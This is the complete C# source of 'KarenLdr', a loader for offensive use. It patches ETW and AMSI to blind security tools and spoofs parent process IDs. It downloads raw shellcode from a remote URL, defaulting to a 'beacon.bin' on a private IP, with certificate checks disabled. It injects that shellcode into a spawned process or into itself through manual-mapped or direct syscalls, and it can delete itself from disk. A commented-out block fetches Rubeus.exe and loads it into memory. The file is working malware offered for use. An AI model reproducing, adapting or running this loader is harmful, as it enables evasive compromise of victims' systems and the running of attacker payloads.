using DInvoke.DynamicInvoke;
using DInvoke.ManualMap;
using Data = DInvoke.Data;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace KarenLdr
{
    internal class Program
    {
        static Data.PE.PE_MANUAL_MAP _ntdllMap;

        public class Options
        {
            [OptionParameter(ShortName = 'u', DefaultValue = "")]
            public string Url { get; set; }

            [OptionParameter(ShortName = 't', DefaultValue = "")]
            public string Target { get; set; }

            [OptionParameter(ShortName = 'p', DefaultValue = 0)]
            public int Parent { get; set; }

            [OptionParameter(ShortName = 'k', DefaultValue = false)]
            public bool Kill { get; set; }

            [OptionParameter(ShortName = 's', DefaultValue = false)]
            public bool Syscall { get; set; }

            [OptionParameter(ShortName = 'h', DefaultValue = false)]
            public bool Help { get; set; }
        }

        public static void banner()
        {
            Console.WriteLine(@"
     _        _______  _______  _______  _        _        ______   _______ 
    | \    /\(  ___  )(  ____ )(  ____ \( (    /|( \      (  __  \ (  ____ )
    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (      | (  \  )| (    )|
    |  (_/ / | (___) || (____)|| (__    |   \ | || |      | |   ) || (____)|
    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |      | |   | ||     __)
    |  ( \ \ | (   ) || (\ (   | (      | | \   || |      | |   ) || (\ (   
    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (____/\| (__/  )| ) \ \__
    |_/    \/|/     \||/   \__/(_______/|/    )_)(_______/(______/ |/   \__/
            ");
        }

        public static void help()
        {
            Console.WriteLine(" KarenLdr: D/Invoke + NT*API + Manual Mapping + Direct Syscall + AMSI & ETW Patching + PPID Spoofing");
            Console.WriteLine("");
            Console.WriteLine("  -u, --url      Required. Remote URL address for raw shellcode.");
            Console.WriteLine("");
            Console.WriteLine("  -t, --target   Specify the target/victim process. Default: Self-injection");
            Console.WriteLine("");
            Console.WriteLine("  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)");
            Console.WriteLine("");
            Console.WriteLine("  -k, --kill     Enable self-destruct to auto wipe file from disk.");
            Console.WriteLine("");
            Console.WriteLine("  -s, --syscall  Enable Direct Syscall. Default: Manual Mapping");
            Console.WriteLine("");
            Console.WriteLine("  -h, --help     Display help screen manual.");
        }

        public static void display(string urlPath, string targetPath, int parentID, bool kill)
        {
            Console.WriteLine("|--------------");
            Console.WriteLine("| Payload       : " + urlPath);
            if (targetPath != "C:\\Windows\\System32\\.exe")
            {
                Console.WriteLine("| Process       : " + targetPath);
                if (parentID != 0)
                {
                    Console.WriteLine("| PPID Spoofing : " + parentID);
                }
            }
            if (kill)
            {
                Console.WriteLine("| Self Destruct : " + "True");
            }
            Console.WriteLine("|--------------");
            Console.WriteLine("");
        }

        public static void SelfDelete(string delay)
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static void spawnProcess(string targetPath, int parent, ref Win32.PROCESS_INFORMATION pi, ref Win32.STARTUPINFOEX si, ref IntPtr lpValue)
        {
            /* Process Attributes Initialization */

            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            const uint CREATE_SUSPENDED = 0x00000004;

            si = new Win32.STARTUPINFOEX();
            pi = new Win32.PROCESS_INFORMATION();
            si.StartupInfo.cb = Marshal.SizeOf(si);

            var pa = new Win32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);
            var ta = new Win32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            lpValue = IntPtr.Zero;
            var fPtr = IntPtr.Zero;

            if (parent != 0)
            {
                /* Parent Process ID Spoofing */

                var lpSize = IntPtr.Zero;
                fPtr = Generic.GetLibraryAddress("kernel32.dll", "InitializeProcThreadAttributeList");
                Win32.InitializeProcThreadAttributeList fnInitializeProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.InitializeProcThreadAttributeList)) as Win32.InitializeProcThreadAttributeList;
                fnInitializeProcThreadAttributeList(
                    IntPtr.Zero,
                    1,
                    0,
                    ref lpSize);

                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                fnInitializeProcThreadAttributeList(
                    si.lpAttributeList,
                    1,
                    0,
                    ref lpSize);

                var phandle = IntPtr.Zero;

                try
                {
                    phandle = Process.GetProcessById(parent).Handle;
                }
                catch (Exception)
                {
                    Console.WriteLine("[-] Unable to open handle to Parent Process!");
                    Process.GetCurrentProcess().Kill();
                }

                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, phandle);

                fPtr = Generic.GetLibraryAddress("kernel32.dll", "UpdateProcThreadAttribute");
                Win32.UpdateProcThreadAttribute fnUpdateProcThreadAttribute = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.UpdateProcThreadAttribute)) as Win32.UpdateProcThreadAttribute;
                fnUpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                /* Creating Target Process */

                object[] parameters =
                {
                    targetPath, null, pa, ta, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, IntPtr.Zero, "C:\\Windows\\System32", si, pi
                };

                pi = createProcess(parameters);
            }
            else
            {
                /* Creating Target Process (No PPID Spoofing) */

                object[] parameters =
                {
                    targetPath, null, pa, ta, false, (uint)4, IntPtr.Zero, "C:\\Windows\\System32", si, pi
                };

                pi = createProcess(parameters);
            }
        }

        public static Win32.PROCESS_INFORMATION createProcess(object[] parameters)
        {
            Console.WriteLine("");
            Console.WriteLine("[>] CreateProcessW()");

            var success = (bool)Generic.DynamicApiInvoke("kernel32.dll", "CreateProcessW", typeof(Win32.CreateProcessW), ref parameters);

            if (success)
            {
                Console.WriteLine("    |-> Target Process Created!");
            }
            else
            {
                Console.WriteLine("    |-> [X] Failed to create process. Error code: {0}", Marshal.GetLastWin32Error());
                Process.GetCurrentProcess().Kill();
            }

            var pi = (Win32.PROCESS_INFORMATION)parameters[9];

            return pi;
        }

        public static void patchETW()
        {
            Console.WriteLine("[>] Patching Event Tracing for Windows (ETW)");

            var hModule = Generic.GetLoadedModuleAddress("ntdll.dll");
            Console.WriteLine("    |-> Address of ntdll.dll: 0x{0:X}", hModule.ToInt64());

            var hFunction = Generic.GetExportAddress(hModule, "EtwEventWrite");
            Console.WriteLine("    |-> Location of EtwEventWrite(): 0x{0:X}", hFunction.ToInt64());

            var patch = new byte[] { 0xC3 };

            var fPtr = Generic.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            Win32.VirtualProtect fnVirtualProtect = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.VirtualProtect)) as Win32.VirtualProtect;
            fnVirtualProtect(
                hFunction,
                (UIntPtr)patch.Length,
                Win32.MemoryProtection.ReadWrite,
                out var oldProtection);
            Console.WriteLine("    |-> Patching Memory: 0x{0:X} -> 0x04", oldProtection);

            Marshal.Copy(patch, 0, hFunction, patch.Length);

            fnVirtualProtect(
                hFunction,
                (UIntPtr)patch.Length,
                oldProtection,
                out _);
            Console.WriteLine("    |-> Restoring Memory: 0x04 -> 0x{0:X}", oldProtection);
        }

        public static void patchAMSI()
        {
            Console.WriteLine("");
            Console.WriteLine("[>] Patching Anti Malware Scan Interface (AMSI)");

            IntPtr hFunction = Generic.GetLibraryAddress(
                "amsi.dll",
                "AmsiScanBuffer",
                true);
            Console.WriteLine("    |-> Address of AmsiScanBuffer(): " + string.Format("0x{0:X}", hFunction.ToInt64()));

            UIntPtr dwSize = (UIntPtr)4;
            var fPtr = Generic.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            Win32.VirtualProtect fnVirtualProtect = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.VirtualProtect)) as Win32.VirtualProtect;

            if (!fnVirtualProtect(hFunction, dwSize, Win32.MemoryProtection.ExecuteReadWrite, out _))
            {
                Console.WriteLine("    |-> [X] Failed to Patch AMSI!");
                Process.GetCurrentProcess().Kill();
            }

            byte[] buf = { 0xcb, 0x05, 0x6a };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(buf, 0, unmanagedPointer, 3);

            fPtr = Generic.GetLibraryAddress("kernel32.dll", "RtlMoveMemory");
            Win32.RtlMoveMemory fnRtlMoveMemory = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.RtlMoveMemory)) as Win32.RtlMoveMemory;
            fnRtlMoveMemory(
                hFunction + 0x001b, 
                unmanagedPointer, 
                3);
            Console.WriteLine("    |-> Successfully Patched AMSI!");
        }

        static async Task Main(string[] args)
        {
            /* Command Line Arguments Parsing */

            var options = CommandLineArgumentParser.Parse<Options>(args).ParsedOptions;
            var urlPath = options.Url;
            var targetPath = "C:\\Windows\\System32\\" + options.Target;
            if (!targetPath.Contains(".exe"))
            { targetPath += ".exe"; }

            /* Entry Point */

            banner();

            if (options.Help)
            {
                help();
                Process.GetCurrentProcess().Kill();
            }
            else if (options.Url == "" && options.Target == "" && options.Parent == 0 && !options.Kill)
            {
                urlPath = "https://192.168.231.128:443/beacon.bin";
                targetPath = "C:\\Windows\\System32\\notepad.exe";
                options.Target = "notepad";
            }

            display(urlPath, targetPath, options.Parent, options.Kill);
            patchETW();
            patchAMSI();

            /* Get Process PID & Handle */

            var pi = new Win32.PROCESS_INFORMATION();
            var si = new Win32.STARTUPINFOEX();
            IntPtr lpValue = IntPtr.Zero;
            var target = new Process();

            if (options.Target != "")
            {
                spawnProcess(targetPath, options.Parent, ref pi, ref si, ref lpValue);
                target = Process.GetProcessById(pi.dwProcessId);
            }
            else
            {
                target = Process.GetCurrentProcess();
                Console.WriteLine("");
                Console.WriteLine("[>] Self-Injecting");
            }

            Console.WriteLine("    |-> PID: {0}", target.Id);

            /* Fetch Shellcode From Remote URL */

            byte[] shellcode = { };

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    client.Timeout = TimeSpan.FromSeconds(3);

                    try
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[>] Fetching Payload");
                        shellcode = await client.GetByteArrayAsync(urlPath);
                        Console.WriteLine("    |-> Payload Retrieved Successfully!");
                    }
                    catch
                    {
                        Console.WriteLine("    |-> [X] Something is wrong with URL address!");
                        Process.GetCurrentProcess().Kill();
                    }
                }
            }

            var fPtr = IntPtr.Zero;

            if (!options.Syscall)
            {
                /* NTDLL.DLL Manual Mapping */

                IntPtr hNtdll = Generic.GetPebLdrModuleEntry("ntdll.dll");
                _ntdllMap = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");

                Console.WriteLine("");
                Console.WriteLine("[>] Resolving Addresses of ntdll.dll");
                Console.WriteLine("    |-> Original ntdll.dll: 0x{0:x}", hNtdll.ToInt64());
                Console.WriteLine("    |-> New copy of ntdll.dll: 0x{0:x}", _ntdllMap.ModuleBase.ToInt64());

                /* Create New Section in Current Process */

                Console.WriteLine("");
                Console.WriteLine("[>] NtCreateSection()");

                var hSection = IntPtr.Zero;
                var maxSize = (ulong)shellcode.Length;

                var parameters = new object[]
                {
                    hSection,
                    (uint)0x10000000,     // SECTION_ALL_ACCESS
                    IntPtr.Zero,
                    maxSize,
                    (uint)0x40,           // PAGE_EXECUTE_READWRITE
                    (uint)0x08000000,     // SEC_COMMIT
                    IntPtr.Zero
                };

                var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                    _ntdllMap.PEINFO,
                    _ntdllMap.ModuleBase,
                    "NtCreateSection",
                    typeof(Win32.NtCreateSection),
                    parameters,
                    false);

                if (status == Data.Native.NTSTATUS.Success)
                {
                    hSection = (IntPtr)parameters[0];
                    Console.WriteLine("    |-> New Section Created!");
                }
                
                /* Map Section As RW */

                Console.WriteLine("");
                Console.WriteLine("[>] NtMapViewOfSection()");

                var localBaseAddress = IntPtr.Zero;
                ulong viewSize = 0;

                parameters = new object[]
                {
                    hSection,
                    (IntPtr)(-1),   // Target current process
                    localBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    viewSize,
                    (uint)2,              // ViewUnmap (created view will not be inherited by child processes)
                    (uint)0,
                    (uint)0x04            // PAGE_READWRITE
                };

                status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                    _ntdllMap.PEINFO,
                    _ntdllMap.ModuleBase,
                    "NtMapViewOfSection",
                    typeof(Win32.NtMapViewOfSection),
                    parameters,
                    false);

                if (status == Data.Native.NTSTATUS.Success)
                {
                    localBaseAddress = (IntPtr)parameters[2];
                    Console.WriteLine("    |-> New Section Mapped!");
                }

                /* Copy Shellcode to Memory Process */

                Console.WriteLine("");
                Console.WriteLine("[>] Copied Shellcode to Memory!");
                Marshal.Copy(shellcode, (Int32)0, localBaseAddress, (Int32)shellcode.Length);

                /* Map Memory Region to Target Process as RX */

                Console.WriteLine("");
                Console.WriteLine("[>] NtMapViewOfSection()");

                var baseAddress = IntPtr.Zero;

                parameters = new object[]
                {
                    hSection,
                    target.Handle,
                    baseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    viewSize,
                    (uint)2,
                    (uint)0,
                    (uint)0x20      // PAGE_EXECUTE_READ
                };

                status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                    _ntdllMap.PEINFO,
                    _ntdllMap.ModuleBase,
                    "NtMapViewOfSection",
                    typeof(Win32.NtMapViewOfSection),
                    parameters,
                    false);

                if (status == Data.Native.NTSTATUS.Success)
                {
                    baseAddress = (IntPtr)parameters[2];
                    Console.WriteLine("    |-> Memory Region Mapped to Target Process!");
                    Console.WriteLine(String.Format("    |-> Base Address: 0x{0:X}", baseAddress.ToInt64()));
                }

                /* Executing Shellcode */

                if (options.Target != "")
                {
                    /* Queueing APC Thread */

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtQueueApcThread()");

                    parameters = new object[]
                    {
                        pi.hThread,
                        baseAddress,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        IntPtr.Zero
                    };

                    status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                        _ntdllMap.PEINFO,
                        _ntdllMap.ModuleBase,
                        "NtQueueApcThread",
                        typeof(Win32.NtQueueApcThread),
                        parameters,
                        false);

                    Console.WriteLine("    |-> Queueing APC!");

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtSetInformationThread()");

                    parameters = new object[]
                    {
                        pi.hThread,
                        (uint)1,
                        IntPtr.Zero,
                        IntPtr.Zero
                    };

                    status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                        _ntdllMap.PEINFO,
                        _ntdllMap.ModuleBase,
                        "NtSetInformationThread",
                        typeof(Win32.NtSetInformationThread),
                        parameters,
                        false);

                    Console.WriteLine("    |-> Thread Priority Set!");

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtResumeThread()");

                    parameters = new object[]
                    {
                        pi.hThread,
                        (ulong)0
                    };

                    status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                        _ntdllMap.PEINFO,
                        _ntdllMap.ModuleBase,
                        "NtResumeThread",
                        typeof(Win32.NtResumeThread),
                        parameters,
                        false);

                    Console.WriteLine("    |-> Resuming Thread!");
                }
                else
                {
                    /* Start Thread In Process */

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtCreateThreadEx()");

                    IntPtr threadHandle = IntPtr.Zero;

                    parameters = new object[]
                    {
                        threadHandle,
                        (UInt32)0x0000FFFF | (UInt32)0x001F0000,
                        IntPtr.Zero,
                        target.Handle,
                        baseAddress,
                        IntPtr.Zero,
                        false,
                        (Int32)0,
                        (Int32)0,
                        (Int32)0,
                        IntPtr.Zero
                    };

                    status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                        _ntdllMap.PEINFO,
                        _ntdllMap.ModuleBase,
                        "NtCreateThreadEx",
                        typeof(Win32.NtCreateThreadEx),
                        parameters,
                        false);

                    if (status == Data.Native.NTSTATUS.Success)
                    {
                        threadHandle = (IntPtr)parameters[0];
                        Console.WriteLine("    |-> Shellcode Executed!");
                    }

                    /* Prevent Process Thread From Exiting (Self-Injection) */

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtWaitForSingleObject()");
                    Console.WriteLine("    |-> Keeping Process Alive!");

                    const uint INFINITE = 0xFFFFFFFF;

                    parameters = new object[]
                    {
                        threadHandle, 
                        false, 
                        Win32.LARGE_INTEGER.FromInt64(INFINITE)
                    };

                    status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                        _ntdllMap.PEINFO,
                        _ntdllMap.ModuleBase,
                        "NtWaitForSingleObject",
                        typeof(Win32.NtWaitForSingleObject),
                        parameters,
                        false);

                    Console.ReadKey();
                }
            }
            else
            {
                /* Direct Syscalls */

                Console.WriteLine("");
                Console.WriteLine("[>] Using Direct Syscall Method!");

                /* Create New Section in Current Process */

                Console.WriteLine("");
                Console.WriteLine("[>] NtCreateSection()");

                var hSection = IntPtr.Zero;
                var maxSize = (ulong)shellcode.Length;
                fPtr = Generic.GetSyscallStub("NtCreateSection");
                Win32.NtCreateSection fnNtCreateSection = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtCreateSection)) as Win32.NtCreateSection;

                fnNtCreateSection(
                    ref hSection,
                    0x10000000,     // SECTION_ALL_ACCESS
                    IntPtr.Zero,
                    ref maxSize,
                    0x40,           // PAGE_EXECUTE_READWRITE
                    0x08000000,     // SEC_COMMIT
                    IntPtr.Zero);

                Console.WriteLine("    |-> New Section Created!");

                /* Map Section As RW */

                Console.WriteLine("");
                Console.WriteLine("[>] NtMapViewOfSection()");

                fPtr = Generic.GetSyscallStub("NtMapViewOfSection");
                Win32.NtMapViewOfSection fnNtMapViewOfSection = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtMapViewOfSection)) as Win32.NtMapViewOfSection;

                fnNtMapViewOfSection(
                    hSection,
                    (IntPtr)(-1),   // Target current process
                    out var localBaseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out var _,
                    2,              // ViewUnmap (created view will not be inherited by child processes)
                    0,
                    0x04);          // PAGE_READWRITE

                Console.WriteLine("    |-> New Section Mapped!");

                /* Copy Shellcode to Memory Process */

                Console.WriteLine("");
                Console.WriteLine("[>] Copied Shellcode to Memory!");
                Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);

                /* Map Memory Region to Target Process as RX */

                Console.WriteLine("");
                Console.WriteLine("[>] NtMapViewOfSection()");

                fnNtMapViewOfSection(
                    hSection,
                    target.Handle,
                    out var baseAddress,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out _,
                    2,
                    0,
                    0x20);      // PAGE_EXECUTE_READ

                Console.WriteLine("    |-> Memory Region Mapped to Target Process!");
                Console.WriteLine(String.Format("    |-> Base Address: 0x{0:X}", baseAddress.ToInt64()));

                /* Executing Shellcode */

                if (options.Target != "")
                {
                    /* Queueing APC Thread */

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtQueueApcThread()");

                    fPtr = Generic.GetSyscallStub("NtQueueApcThread");
                    Win32.NtQueueApcThread fnNtQueueApcThread = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtQueueApcThread)) as Win32.NtQueueApcThread;
                    fnNtQueueApcThread(
                        pi.hThread,
                        baseAddress,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        IntPtr.Zero);

                    Console.WriteLine("    |-> Queueing APC!");

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtSetInformationThread()");

                    fPtr = Generic.GetSyscallStub("NtSetInformationThread");
                    Win32.NtSetInformationThread fnNtSetInformationThread = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtSetInformationThread)) as Win32.NtSetInformationThread;
                    fnNtSetInformationThread(
                        pi.hThread,
                        1,
                        IntPtr.Zero,
                        IntPtr.Zero);

                    Console.WriteLine("    |-> Thread Priority Set!");

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtResumeThread()");

                    fPtr = Generic.GetSyscallStub("NtResumeThread");
                    Win32.NtResumeThread fnNtResumeThread = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtResumeThread)) as Win32.NtResumeThread;
                    fnNtResumeThread(
                        pi.hThread,
                        (ulong)0);

                    Console.WriteLine("    |-> Resuming Thread!");
                }
                else
                {
                    /* Start Thread In Process */

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtCreateThreadEx()");

                    IntPtr threadHandle = IntPtr.Zero;
                    fPtr = Generic.GetSyscallStub("NtCreateThreadEx");
                    Win32.NtCreateThreadEx fnNtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtCreateThreadEx)) as Win32.NtCreateThreadEx;
                    fnNtCreateThreadEx(
                        ref threadHandle,
                        0x0000FFFF | 0x001F0000,
                        IntPtr.Zero,
                        target.Handle,
                        baseAddress,
                        IntPtr.Zero,
                        false,
                        0,
                        0,
                        0,
                        IntPtr.Zero);

                    Console.WriteLine("    |-> Shellcode Executed!");

                    /* Prevent Process Thread From Exiting (Self-Injection) */

                    const uint INFINITE = 0xFFFFFFFF;
                    fPtr = Generic.GetSyscallStub("NtWaitForSingleObject");
                    Win32.NtWaitForSingleObject fnNtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtWaitForSingleObject)) as Win32.NtWaitForSingleObject;

                    Console.WriteLine("");
                    Console.WriteLine("[>] NtWaitForSingleObject()");
                    Console.WriteLine("    |-> Keeping Process Alive!");
                    fnNtWaitForSingleObject(threadHandle, false, Win32.LARGE_INTEGER.FromInt64(INFINITE));
                    Console.ReadKey();
                }
            }
            
            /* Cleanup Leftover Artifacts */

            if (si.lpAttributeList != IntPtr.Zero)
            {
                fPtr = Generic.GetLibraryAddress("kernel32.dll", "DeleteProcThreadAttributeList");
                Win32.DeleteProcThreadAttributeList fnDeleteProcThreadAttributeList = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.DeleteProcThreadAttributeList)) as Win32.DeleteProcThreadAttributeList;
                fnDeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
                Console.WriteLine("");
                Console.WriteLine("[>] DeleteProcThreadAttributeList()");
                Console.WriteLine("    |-> Deleting Process Artifacts!");
            }

            // Closing Opened Handles

            fPtr = Generic.GetLibraryAddress("kernel32.dll", "CloseHandle");
            Win32.CloseHandle fnCloseHandle = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.CloseHandle)) as Win32.CloseHandle;

            if (pi.hProcess != IntPtr.Zero)
            {
                fnCloseHandle(pi.hProcess);
                Console.WriteLine("");
                Console.WriteLine("[>] CloseHandle()");
                Console.WriteLine("    |-> Closing Process Handle!");
            }
            if (pi.hThread != IntPtr.Zero)
            {
                fnCloseHandle(pi.hThread);
                Console.WriteLine("");
                Console.WriteLine("[>] CloseHandle()");
                Console.WriteLine("    |-> Closing Thread Handle!");
            }

            /* File Self-Destruct */

            if (options.Kill)
            {
                SelfDelete("1");
                Console.WriteLine("");
                Console.WriteLine("[>] KarenLdr.exe removed from disk!");
            }

            /* Load Assembly */
            /*byte[] bytes;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    bytes = await client.GetByteArrayAsync("https://192.168.231.128:443/Rubeus.exe");
                }
            }

            var assembly = Assembly.Load(bytes);

            assembly.EntryPoint.Invoke(null, new object[] { args });*/
        }
    }
}